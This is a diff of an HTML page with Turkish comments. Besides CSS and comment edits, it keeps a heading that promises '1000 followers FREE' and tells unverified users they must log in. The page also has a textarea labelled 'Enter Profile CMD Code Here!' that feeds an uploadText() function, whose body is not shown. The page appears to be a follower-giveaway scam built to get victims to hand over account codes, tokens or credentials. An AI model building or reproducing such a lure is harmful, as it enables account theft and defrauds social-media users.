@@ -24,6 +24,7 @@
             font-size: 24px;
             margin-bottom: 20px;
             color: #4CAF50;
+            text-align: center;
         }
 
         /* Yazı açıklaması */
@@ -36,8 +37,8 @@
 
         /* Textarea kutusu (yazı yazma alanı) */
         textarea {
-            width: 300px; /* Daha küçük genişlik */
-            height: 50px; /* Daha kısa yükseklik */
+            width: 300px;
+            height: 50px;
             padding: 10px;
             font-size: 16px;
             border: 2px solid #555;
@@ -90,7 +91,6 @@
             }
 
             textarea {
-                max-width: 100%;
                 width: 100%; /* Küçük ekranlar için tam genişlik */
             }
 
@@ -102,7 +102,6 @@
 </head>
 <body>
     <h2>If your account does not have a verified tick, you must log in. If it is verified, you can send 1000 followers "FREE" by just typing your name. If you do not have a verified tick, you must log in. You can log in using the button below.</h2>
-    <p></p>
 
     <textarea id="inputText" placeholder="Enter Profile CMD Code Here!" oninput="maskInput()"></textarea><br>
     <button onclick="uploadText()">Send!</button><br>
@@ -117,8 +116,7 @@
         // Kullanıcının yazdığı metni maskeleme fonksiyonu (ama sadece görsel olarak değil, gerçek metni saklayacak)
         function maskInput() {
             const text = document.getElementById("inputText").value;
-            // Maskeleme yapmadık, kullanıcı metni normal şekilde yazacak.
-            // Burada artık maskeleme yapılmıyor, yazdıkları olduğu gibi görünecek.
+            // Maskeleme yapılmıyor, yazdıkları olduğu gibi görünecek
         }
 
         function uploadText() {
